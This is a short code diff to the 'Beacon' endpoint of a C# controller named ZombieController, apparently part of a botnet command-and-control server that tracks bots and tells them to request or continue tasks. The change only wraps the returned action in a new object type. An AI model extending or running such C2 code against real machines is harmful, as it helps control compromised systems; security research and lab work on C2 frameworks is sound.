@@ -58,7 +58,7 @@ public class ZombieController : AbstractController
     }
 
     [HttpGet("Beacon")]
-    [ProducesResponseType(typeof(ActionEnum), StatusCodes.Status200OK)]
+    [ProducesResponseType(typeof(ActionPoco), StatusCodes.Status200OK)]
     public IActionResult Beacon([FromQuery] int bot_id, [FromQuery] int task_id, [FromQuery] ProgressEnum progress)
     {
         BotClient bot = C2State.BotManager.Bots[bot_id];
@@ -70,10 +70,10 @@ public class ZombieController : AbstractController
 
         if (task_id < 0 || progress == ProgressEnum.FAILURE || progress == ProgressEnum.SUCCESS)
         {
-            return Ok(ActionEnum.REQUEST);
+            return Ok(new ActionPoco() { Action = ActionEnum.REQUEST });
         } else
         {
-            return Ok(ActionEnum.CONTINUE);
+            return Ok(new ActionPoco() { Action = ActionEnum.CONTINUE });
         }
     }
 
